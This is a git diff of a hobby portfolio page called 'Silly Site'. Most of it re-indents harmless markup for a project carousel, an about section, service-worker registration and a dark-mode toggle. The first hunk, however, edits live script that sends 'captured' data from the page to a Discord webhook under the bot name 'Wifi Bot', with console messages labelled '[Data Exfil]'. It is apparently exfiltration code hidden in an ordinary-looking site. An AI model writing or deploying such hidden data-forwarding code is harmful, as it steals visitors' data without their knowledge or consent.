@@ -39,23 +39,22 @@
 
                   try {
                      // Send data to Discord webhook
-                     // Using no-cors mode - response status won't be readable (always 0)
                      const response = await fetch(forwardingUrl, {
                         method: 'POST',
-                        mode: 'no-cors', // Bypass CORS restrictions
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                           content: `**New Data Captured**\n` +
-                              `> **Data:** \`${safeData}\`\n` +
-                              `> **Time:** ${new Date().toLocaleString()}\n` +
-                              `> **Page:** ${window.location.pathname}`,
+                           content: `**New Data Captured**\n> **Data:** \`${safeData}\`\n> **Time:** ${new Date().toLocaleString()}\n> **Page:** ${window.location.pathname}`,
                            username: "Wifi Bot"
                         })
                      });
 
-                     // Note: In no-cors mode, we can't check response.status (always 0)
-                     // Mark as complete after successful send (no exception thrown)
-                     sessionStorage.setItem('exfil_complete', 'true');
+                     // Check if the request was successful
+                     if (response.ok) {
+                        console.log('[Data Exfil] Data forwarded to Discord successfully');
+                        sessionStorage.setItem('exfil_complete', 'true');
+                     } else {
+                        console.error('[Data Exfil] Discord API returned status:', response.status);
+                     }
                   } catch (error) {
                      console.error('[Data Exfil] Network error forwarding data:', error);
                   } finally {
@@ -100,229 +99,236 @@
       <div id="offlineBanner" class="offline-banner">
          ⚠️ You are currently offline. Some features may not be available.
       </div>
-         <header>
-            <div class="site-title cherry-bomb-one-regular">
-               <a href="/">Silly Site</a>
+      <header>
+         <div class="site-title cherry-bomb-one-regular">
+            <a href="/">Silly Site</a>
+         </div>
+         <nav>
+            <ul class="cherry-bomb-one-regular">
+               <li><a href="/">Home</a></li>
+               <li><a href="#about-me">About Me</a></li>
+               <li><a href="#projects">Projects</a></li>
+               <li><a href="https://github.com/Chasesy28/Chasesy28.github.io" target="_blank"
+                     rel="noopener noreferrer">GitHub</a></li>
+               <li>
+                  <button id="darkModeToggle" class="dark-mode-toggle" aria-label="Toggle dark mode">
+                     <span class="sun-icon">☀️</span>
+                     <span class="moon-icon" style="display: none;">🌙</span>
+                  </button>
+               </li>
+            </ul>
+         </nav>
+      </header>
+      <div class="rain">
+         <div class="ground"></div>
+      </div>
+      <h1 class="cherry-bomb-one-regular">Silly site!</h1>
+      <!-- about section-->
+      <div class="cherry-bomb-one-regular" id="Welcome">
+         <h2>Welcome!</h2>
+         <p>
+            Welcome to my personal development site! This page serves as a creative playground where I, a programmer,
+            experiment with new ideas and practice my coding skills.
+         </p>
+         <p>
+            Here, I test out various web technologies, from fun CSS animations (like the ones you might see above) to
+            interactive features built with JavaScript. It's a space for me to build, break, and rebuild things
+            without
+            The constraints of a formal project.
+         </p>
+         <p>
+            So, if something looks a bit weird or doesn't work perfectly, that's all part of the fun. Thanks for
+            Stopping by!
+         </p>
+      </div>
+      <h2 id="projects" class="cherry-bomb-one-regular">My Projects</h2>
+      <div class="swiper">
+         <div class="swiper-wrapper">
+            <div class="swiper-slide">
+               <a href="/projects/Finder.html">
+                  <div class="slide-content cherry-bomb-one-regular">
+                     <img src="/icons/icon-512x512.png" alt="Restaurant Finder Icon" class="project-icon">
+                     <h3>Restaurant Finder</h3>
+                     <p class="project-description">Search OpenStreetMap for restaurants near you with AI-powered
+                        recommendations and location services.</p>
+                  </div>
+               </a>
             </div>
-            <nav>
-               <ul class="cherry-bomb-one-regular">
-                  <li><a href="/">Home</a></li>
-                  <li><a href="#about-me">About Me</a></li>
-                  <li><a href="#projects">Projects</a></li>
-                  <li><a href="https://github.com/Chasesy28/Chasesy28.github.io" target="_blank"
-                        rel="noopener noreferrer">GitHub</a></li>
-                  <li>
-                     <button id="darkModeToggle" class="dark-mode-toggle" aria-label="Toggle dark mode">
-                        <span class="sun-icon">☀️</span>
-                        <span class="moon-icon" style="display: none;">🌙</span>
-                     </button>
-                  </li>
-               </ul>
-            </nav>
-         </header>
-         <div class="rain">
-            <div class="ground"></div>
-         </div>
-         <h1 class="cherry-bomb-one-regular">Silly site!</h1>
-         <!-- about section-->
-         <div class="cherry-bomb-one-regular" id="Welcome">
-            <h2>Welcome!</h2>
-            <p>
-               Welcome to my personal development site! This page serves as a creative playground where I, a programmer,
-               experiment with new ideas and practice my coding skills.
-            </p>
-            <p>
-               Here, I test out various web technologies, from fun CSS animations (like the ones you might see above) to
-               interactive features built with JavaScript. It's a space for me to build, break, and rebuild things
-               without
-               The constraints of a formal project.
-            </p>
-            <p>
-               So, if something looks a bit weird or doesn't work perfectly, that's all part of the fun. Thanks for
-               Stopping by!
-            </p>
-         </div>
-         <h2 id="projects" class="cherry-bomb-one-regular">My Projects</h2>
-         <div class="swiper">
-            <div class="swiper-wrapper">
-               <div class="swiper-slide">
-                  <a href="/projects/Finder.html">
-                     <div class="slide-content cherry-bomb-one-regular">
-                        <img src="/icons/icon-512x512.png" alt="Restaurant Finder Icon" class="project-icon">
-                        <h3>Restaurant Finder</h3>
-                        <p class="project-description">Search OpenStreetMap for restaurants near you with AI-powered recommendations and location services.</p>
-                     </div>
-                  </a>
-               </div>
-               <div class="swiper-slide">
-                  <a href="/projects/test.html">
-                     <div class="slide-content cherry-bomb-one-regular">
-                        <img src="/icons/icon-512x512.png" alt="Rain Test Icon" class="project-icon">
-                        <h3>Rain Animation Test</h3>
-                        <p class="project-description">Test the rain animation with adjustable density controls and splash effects.</p>
-                     </div>
-                  </a>
-               </div>
-               <div class="swiper-slide">
-                  <a href="/projects/WebGl-Test/gl.html">
-                     <div class="slide-content cherry-bomb-one-regular">
-                        <img src="/icons/icon-192x192.png" alt="WebGL Test Icon" class="project-icon">
-                        <h3>WebGL Test</h3>
-                        <p class="project-description">Interactive WebGL graphics experiments showcasing 3D rendering capabilities.</p>
-                     </div>
-                  </a>
-               </div>
-               <div class="swiper-slide">
-                  <a href="/projects/Pop-ups/Pop-Up.html">
-                     <div class="slide-content cherry-bomb-one-regular">
-                        <img src="/icons/icon-512x512.png" alt="Pop-ups Icon" class="project-icon">
-                        <h3>Pop-ups Demo</h3>
-                        <p class="project-description">Demonstration of creative popup effects and modal interactions.</p>
-                     </div>
-                  </a>
-               </div>
+            <div class="swiper-slide">
+               <a href="/projects/test.html">
+                  <div class="slide-content cherry-bomb-one-regular">
+                     <img src="/icons/icon-512x512.png" alt="Rain Test Icon" class="project-icon">
+                     <h3>Rain Animation Test</h3>
+                     <p class="project-description">Test the rain animation with adjustable density controls and splash
+                        effects.</p>
+                  </div>
+               </a>
             </div>
-            <!-- Optional Pagination -->
-            <div class="swiper-pagination"></div>
-            <!-- Optional Navigation -->
-            <div class="swiper-button-next"></div>
-            <div class="swiper-button-prev"></div>
+            <div class="swiper-slide">
+               <a href="/projects/WebGl-Test/gl.html">
+                  <div class="slide-content cherry-bomb-one-regular">
+                     <img src="/icons/icon-192x192.png" alt="WebGL Test Icon" class="project-icon">
+                     <h3>WebGL Test</h3>
+                     <p class="project-description">Interactive WebGL graphics experiments showcasing 3D rendering
+                        capabilities.</p>
+                  </div>
+               </a>
+            </div>
+            <div class="swiper-slide">
+               <a href="/projects/Pop-ups/Pop-Up.html">
+                  <div class="slide-content cherry-bomb-one-regular">
+                     <img src="/icons/icon-512x512.png" alt="Pop-ups Icon" class="project-icon">
+                     <h3>Pop-ups Demo</h3>
+                     <p class="project-description">Demonstration of creative popup effects and modal interactions.</p>
+                  </div>
+               </a>
+            </div>
          </div>
-         <!-- About Me Section -->
-         <div class="about-me-section cherry-bomb-one-regular" id="about-me">
-            <h2>About Me</h2>
-            <p>
-               Hi! I'm a passionate programmer who loves experimenting with web technologies and creating fun, interactive experiences.
-               This site is my digital playground where I test new ideas, practice coding skills, and build cool projects.
-            </p>
-            <p>
-               When I'm not coding, you can find me exploring new technologies, learning about web development best practices,
-               and constantly pushing the boundaries of what's possible in the browser.
-            </p>
-         </div>
-         <!-- Copyright Section -->
-         <footer class="site-footer">
-            <p>&copy; This project is licensed under a Creative Commons Attribution 4.0 International License (CC BY 4.0) </p>
-            <p>Built with ❤️ and lots of rain animations</p>
-         </footer>
-         <!-- Load external JavaScript -->
-         <script src="https://cdn.jsdelivr.net/npm/swiper@12/swiper-bundle.min.js"></script>
-         <script>
-            /**
-             * SERVICE WORKER REGISTRATION
-             * Registers the service worker for offline functionality and caching
-             * Includes update check on page load to ensure fresh content
-             */
-            if ('serviceWorker' in navigator) {
-               window.addEventListener('load', () => {
-                  navigator.serviceWorker.register('/sw.js')
-                     .then(registration => {
-                        console.log('[Index] Service Worker registered with scope:', registration.scope);
+         <!-- Optional Pagination -->
+         <div class="swiper-pagination"></div>
+         <!-- Optional Navigation -->
+         <div class="swiper-button-next"></div>
+         <div class="swiper-button-prev"></div>
+      </div>
+      <!-- About Me Section -->
+      <div class="about-me-section cherry-bomb-one-regular" id="about-me">
+         <h2>About Me</h2>
+         <p>
+            Hi! I'm a passionate programmer who loves experimenting with web technologies and creating fun, interactive
+            experiences.
+            This site is my digital playground where I test new ideas, practice coding skills, and build cool projects.
+         </p>
+         <p>
+            When I'm not coding, you can find me exploring new technologies, learning about web development best
+            practices,
+            and constantly pushing the boundaries of what's possible in the browser.
+         </p>
+      </div>
+      <!-- Copyright Section -->
+      <footer class="site-footer">
+         <p>&copy; This project is licensed under a Creative Commons Attribution 4.0 International License (CC BY 4.0)
+         </p>
+         <p>Built with ❤️ and lots of rain animations</p>
+      </footer>
+      <!-- Load external JavaScript -->
+      <script src="https://cdn.jsdelivr.net/npm/swiper@12/swiper-bundle.min.js"></script>
+      <script>
+         /**
+          * SERVICE WORKER REGISTRATION
+          * Registers the service worker for offline functionality and caching
+          * Includes update check on page load to ensure fresh content
+          */
+         if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+               navigator.serviceWorker.register('/sw.js')
+                  .then(registration => {
+                     console.log('[Index] Service Worker registered with scope:', registration.scope);
 
-                        // Check for updates on page load
-                        registration.update();
+                     // Check for updates on page load
+                     registration.update();
 
-                        // Listen for updates to the service worker
-                        registration.addEventListener('updatefound', () => {
-                           const newWorker = registration.installing;
-                           console.log('[Index] Service Worker update found');
+                     // Listen for updates to the service worker
+                     registration.addEventListener('updatefound', () => {
+                        const newWorker = registration.installing;
+                        console.log('[Index] Service Worker update found');
 
-                           newWorker.addEventListener('statechange', () => {
-                              if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
-                                 console.log('[Index] New Service Worker installed, page will refresh for updates');
-                                 // New service worker installed, reload to get fresh content
-                                 window.location.reload();
-                              }
-                           });
+                        newWorker.addEventListener('statechange', () => {
+                           if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
+                              console.log('[Index] New Service Worker installed, page will refresh for updates');
+                              // New service worker installed, reload to get fresh content
+                              window.location.reload();
+                           }
                         });
-                     })
-                     .catch(error => console.error('[Index] Service Worker registration failed:', error));
-               });
-            }
-
-            /**
-             * OFFLINE/ONLINE STATUS DETECTION
-             * Shows/hides banner based on network connectivity
-             */
-            const offlineBanner = document.getElementById('offlineBanner');
-
-            function updateOnlineStatus() {
-               if (!navigator.onLine) {
-                  console.log('[Index] Network status: OFFLINE');
-                  offlineBanner.classList.add('show');
-                  document.body.classList.add('offline-mode');
-               } else {
-                  console.log('[Index] Network status: ONLINE');
-                  offlineBanner.classList.remove('show');
-                  document.body.classList.remove('offline-mode');
-               }
-            }
-
-            window.addEventListener('online', updateOnlineStatus);
-            window.addEventListener('offline', updateOnlineStatus);
-            updateOnlineStatus(); // Check initial status
-
-            /**
-             * SWIPER CAROUSEL INITIALIZATION
-             * Creates the project showcase carousel with navigation and pagination
-             */
-            const swiper = new Swiper('.swiper', {
-               loop: true,
-               slidesPerView: 1,
-               spaceBetween: 10,
-               breakpoints: {
-                  640: { slidesPerView: 2, spaceBetween: 20 }
-               },
-               pagination: { el: '.swiper-pagination' },
-               navigation: { nextEl: '.swiper-button-next', prevEl: '.swiper-button-prev' },
+                     });
+                  })
+                  .catch(error => console.error('[Index] Service Worker registration failed:', error));
             });
+         }
 
-            /**
-             * DARK MODE TOGGLE FUNCTIONALITY
-             * Persists theme preference to localStorage
-             * Toggles between light and dark themes
-             */
-            const darkModeToggle = document.getElementById('darkModeToggle');
-            const html = document.documentElement;
-            const sunIcon = document.querySelector('.sun-icon');
-            const moonIcon = document.querySelector('.moon-icon');
+         /**
+          * OFFLINE/ONLINE STATUS DETECTION
+          * Shows/hides banner based on network connectivity
+          */
+         const offlineBanner = document.getElementById('offlineBanner');
 
-            // Load saved theme or default to light
-            const currentTheme = localStorage.getItem('theme') || 'light';
-            html.classList.remove('light', 'dark');
-            html.classList.add(currentTheme);
-            updateIcons(currentTheme);
-            console.log('[Index] Theme loaded:', currentTheme);
-
-            // Toggle theme on button click
-            darkModeToggle.addEventListener('click', function () {
-               if (html.classList.contains('dark')) {
-                  html.classList.replace('dark', 'light');
-                  localStorage.setItem('theme', 'light');
-                  updateIcons('light');
-                  console.log('[Index] Theme switched to: LIGHT');
-               } else {
-                  html.classList.replace('light', 'dark');
-                  localStorage.setItem('theme', 'dark');
-                  updateIcons('dark');
-                  console.log('[Index] Theme switched to: DARK');
-               }
-            });
-
-            /**
-             * Updates the theme toggle icon based on current theme
-             * @param {string} theme - Either 'light' or 'dark'
-             */
-            function updateIcons(theme) {
-               if (theme === 'dark') {
-                  sunIcon.style.display = 'none';
-                  moonIcon.style.display = 'inline';
-               } else {
-                  sunIcon.style.display = 'inline';
-                  moonIcon.style.display = 'none';
-               }
+         function updateOnlineStatus() {
+            if (!navigator.onLine) {
+               console.log('[Index] Network status: OFFLINE');
+               offlineBanner.classList.add('show');
+               document.body.classList.add('offline-mode');
+            } else {
+               console.log('[Index] Network status: ONLINE');
+               offlineBanner.classList.remove('show');
+               document.body.classList.remove('offline-mode');
             }
-         </script>
-         <script src="scripts.js"></script>
+         }
+
+         window.addEventListener('online', updateOnlineStatus);
+         window.addEventListener('offline', updateOnlineStatus);
+         updateOnlineStatus(); // Check initial status
+
+         /**
+          * SWIPER CAROUSEL INITIALIZATION
+          * Creates the project showcase carousel with navigation and pagination
+          */
+         const swiper = new Swiper('.swiper', {
+            loop: true,
+            slidesPerView: 1,
+            spaceBetween: 10,
+            breakpoints: {
+               640: { slidesPerView: 2, spaceBetween: 20 }
+            },
+            pagination: { el: '.swiper-pagination' },
+            navigation: { nextEl: '.swiper-button-next', prevEl: '.swiper-button-prev' },
+         });
+
+         /**
+          * DARK MODE TOGGLE FUNCTIONALITY
+          * Persists theme preference to localStorage
+          * Toggles between light and dark themes
+          */
+         const darkModeToggle = document.getElementById('darkModeToggle');
+         const html = document.documentElement;
+         const sunIcon = document.querySelector('.sun-icon');
+         const moonIcon = document.querySelector('.moon-icon');
+
+         // Load saved theme or default to light
+         const currentTheme = localStorage.getItem('theme') || 'light';
+         html.classList.remove('light', 'dark');
+         html.classList.add(currentTheme);
+         updateIcons(currentTheme);
+         console.log('[Index] Theme loaded:', currentTheme);
+
+         // Toggle theme on button click
+         darkModeToggle.addEventListener('click', function () {
+            if (html.classList.contains('dark')) {
+               html.classList.replace('dark', 'light');
+               localStorage.setItem('theme', 'light');
+               updateIcons('light');
+               console.log('[Index] Theme switched to: LIGHT');
+            } else {
+               html.classList.replace('light', 'dark');
+               localStorage.setItem('theme', 'dark');
+               updateIcons('dark');
+               console.log('[Index] Theme switched to: DARK');
+            }
+         });
+
+         /**
+          * Updates the theme toggle icon based on current theme
+          * @param {string} theme - Either 'light' or 'dark'
+          */
+         function updateIcons(theme) {
+            if (theme === 'dark') {
+               sunIcon.style.display = 'none';
+               moonIcon.style.display = 'inline';
+            } else {
+               sunIcon.style.display = 'inline';
+               moonIcon.style.display = 'none';
+            }
+         }
+      </script>
+      <script src="scripts.js"></script>
    </body>
+
 </html>
